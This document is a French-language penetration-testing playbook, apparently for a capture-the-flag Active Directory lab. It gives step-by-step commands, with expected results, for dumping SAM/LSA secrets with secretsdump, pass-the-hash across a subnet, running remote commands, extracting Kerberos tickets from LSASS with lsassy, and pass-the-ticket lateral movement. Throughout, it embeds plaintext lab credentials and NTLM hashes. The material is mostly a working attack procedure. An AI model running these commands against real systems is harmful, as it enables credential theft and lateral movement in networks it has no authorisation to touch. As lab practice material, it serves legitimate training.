# Playbook 05 — PTH, lsassy, secretsdump, PtT, pivot

> Runbook étapes 46–58 | Challenges : *Passe moi le sel*, *Caché dans le secret LSA*, *Cible acquise KRB*

## Variables

```bash
export SUBNET=10.13.37.0/24
export LOCAL_ADMIN_HASH='fafb12f22417628bb6422e9bb8686f5c'
```

---

### Étape 1 — Dump SAM/LSA (secretsdump) sur WK-123 en admin

```bash
secretsdump.py celestina.shop/a.nozer:'C3L3stin4!Us3r'@10.13.37.123
```

**Résultat attendu** : hash Administrateur local `fafb12f22417628bb6422e9bb8686f5c`.

**Journal** : étape avant PTH massif.

---

### Étape 2 — Pass-The-Hash admin local (réutilisation)

```bash
nxc smb 10.13.37.0/24 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth
```

**Résultat attendu (TP blanc)** : `(Pwn3d!)` sur **WK-123** et **WK-124**.

**Journal** : flag *Passe moi le sel, euh le hash*.

---

### Étape 3 — ipconfig sur machine compromise (chercher pivot)

```bash
nxc smb 10.13.37.123 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -x 'ipconfig'
nxc smb 10.13.37.124 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -x 'ipconfig'
```

**Résultat attendu** : une seule interface 10.13.37.x sauf machine dual-homed → **10.37.13.x**.

---

### Étape 4 — lsassy sur WK-123 (tickets Kerberos)

```bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
ls -lh /root/.nxc/modules/lsassy/
```

**Résultat attendu** :
- `Saved N Kerberos ticket(s)`
- TGT **k.udele** → PtT
- Parfois flag dans sortie SMB : `flag4:CCHDFLM{...}`

**Journal** : flag *Caché dans le secret LSA*.

---

### Étape 5 — lsassy WK-124 (souvent bloqué)

```bash
nxc smb 10.13.37.124 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -M lsassy
```

**Si** `Unable to dump lsass` : normal (Defender), rester sur WK-123.

---

### Étape 6 — Pass-The-Ticket (k.udele)

```bash
export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache"
klist
bash scripts/gen-targets-fqdn.sh targets.txt
nxc smb targets.txt -u 'k.udele' -k -d celestina.shop --use-kcache
```

**Résultat attendu** : `[+] ... from ccache` sans `(Pwn3d!)` → continuer BloodHound / Shadow.

**Journal** : *Cible acquise, protocole KRB enclenché*.

---

### Étape 7 — LAPS check (WK-044)

```bash
secretsdump.py celestina.shop/k.cheh@10.13.37.44 -hashes :2b96340904f32f7888a232c79ea37610
nxc smb 10.13.37.0/24 -u Administrator -H '71f14af9da1e0574fec87a153ca23114' --local-auth
```

**Résultat attendu** : échec sur autres machines → LAPS actif.
